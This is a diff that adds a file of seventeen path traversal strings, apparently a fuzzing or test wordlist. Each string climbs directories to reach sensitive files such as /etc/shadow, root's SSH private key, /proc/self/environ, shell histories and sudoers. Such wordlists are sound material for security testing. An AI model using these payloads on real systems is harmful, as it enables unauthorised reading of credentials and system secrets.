@@ -1,0 +1,17 @@
+../../../etc/passwd
+../../../../root/.bashrc
+..\\..\\..\\Windows\\System32\\cmd.exe
+../../../proc/self/environ
+../../../../root/.ssh/id_rsa
+../../../etc/shadow
+../../../../home/user/.bash_history
+../../../var/log/auth.log
+../../../etc/hostname
+../../../proc/version
+../../../sys/class/net/eth0/address
+../../../root/.mysql_history
+../../../var/spool/cron/crontabs/root
+../../../etc/sudoers
+../../../boot/grub/grub.cfg
+../../../proc/self/cmdline
+../../../sys/kernel/security/apparmor/profiles
